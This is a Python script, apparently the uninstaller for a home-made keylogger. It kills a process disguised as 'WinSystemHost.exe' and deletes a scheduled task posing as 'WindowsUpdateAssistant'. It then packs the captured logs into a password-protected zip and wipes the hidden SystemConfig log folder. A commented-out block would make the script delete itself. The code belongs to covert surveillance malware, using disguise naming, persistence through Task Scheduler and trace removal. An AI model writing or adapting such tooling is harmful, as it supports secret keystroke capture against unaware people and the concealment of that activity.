import os
import sys
import subprocess
import shutil
import pyzipper # Use pyzipper instead of pyminizip
import psutil
import time
from datetime import datetime

def decommission():
    root_path = os.path.join(os.environ['LOCALAPPDATA'], "SystemConfig")
    zip_name = f"Final_Evidence_{datetime.now().strftime('%Y%m%d_%H%M')}.zip"
    destination_zip = os.path.join(os.path.expanduser("~\\Desktop"), zip_name)
    
    password = b"123" # pyzipper requires the password in bytes (the 'b' prefix)
    main_exe_name = "WinSystemHost.exe" # Use the name you gave your logger
    task_name = "WindowsUpdateAssistant"

    print("--- OMNI-TRACE DECOMMISSIONING SEQUENCE ---")

    # 1. STOP THE LOGGER
    print("[1/5] Killing running processes...")
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] == main_exe_name:
            try:
                proc.kill()
                print(f"      Stopped {main_exe_name}")
            except: pass

    # 2. REMOVE PERSISTENCE
    print("[2/5] Deleting Task Scheduler entry...")
    subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, capture_output=True)

    # 3. ZIP EVERYTHING (AES Encrypted)
    if os.path.exists(root_path):
        print(f"[3/5] Archiving logs to {zip_name}...")
        
        with pyzipper.AESZipFile(destination_zip, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zf:
            zf.setpassword(password)
            for root, dirs, files in os.walk(root_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    # This preserves the folder structure inside the ZIP
                    arcname = os.path.relpath(file_path, root_path)
                    zf.write(file_path, arcname)
        
        print(f"      Evidence secured on Desktop (Password: 123)")

        # 4. WIPE TRACES
        print("[4/5] Deleting the SystemConfig folder...")
        time.sleep(2) 
        shutil.rmtree(root_path)
    
    # # # 5. SELF-DESTRUCT
    # print("[5/5] Finalizing... Cleaner will delete itself.")
    # subprocess.Popen(f'cmd /c timeout /t 3 & del "{sys.argv[0]}"', shell=True)
    # sys.exit()

        # 5. FINALIZING
        print("[5/5] Finalizing... Cleaning complete.")
        # The self-destruct command has been removed.
        # The program will now simply close without deleting itself.
        print("\n[COMPLETE] Evidence is on the Desktop. This window will close in 3 seconds.")
        time.sleep(3) 
        sys.exit()

if __name__ == "__main__":
    decommission()